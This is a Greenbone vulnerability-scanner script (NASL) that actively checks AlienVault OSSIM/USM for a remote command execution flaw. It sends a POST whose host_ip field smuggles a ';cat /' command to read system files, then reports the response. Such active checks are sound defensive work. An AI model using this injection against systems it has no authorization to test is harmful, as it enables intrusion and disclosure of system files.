# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140234");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2017-04-03 17:33:13 +0200 (Mon, 03 Apr 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_name("AlienVault OSSIM/USM < 5.3.6 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_ossim_web_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 40011);
  script_mandatory_keys("OSSIM/installed");

  script_tag(name:"summary", value:"AlienVault OSSIM and USM are prone to a remote command execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability can be found in the default installation
  without any plugins. The function get_fqdn do not validate user input.");

  script_tag(name:"solution", value:"Update to version 5.3.6 or later.");

  script_tag(name:"affected", value:"The vulnerability was introduced in the v5.3.4 update and
  affects only v5.3.4 and v5.3.5 of USM Appliance and OSSIM.");

  # nb: Both links are 404/dead but no replacements have been found so far.
  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3085");
  script_xref(name:"URL", value:"https://www.alienvault.com/forums/discussion/8415/alienvault-v5-3-6-hotfix-important-update");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

cpe_list = make_list( "cpe:/a:alienvault:open_source_security_information_management", "cpe:/a:alienvault:unified_security_management" );

if( ! infos = get_app_port_from_list( cpe_list:cpe_list, service:"www" ) )
  exit( 0 );

cpe  = infos["cpe"];
port = infos["port"];

if( ! get_app_location( cpe:cpe, port:port, nofork:TRUE ) )
  exit( 0 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  data = 'host_ip=' + get_host_ip()  + ';cat /' + file;

  req = http_post_put_req( port:port,
                           url:"/av/api/1.0/system/local/network/fqdn",
                           data:data,
                           add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern, icase:TRUE ) ) {
    report = 'It was possible to execute `cat /' + file + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
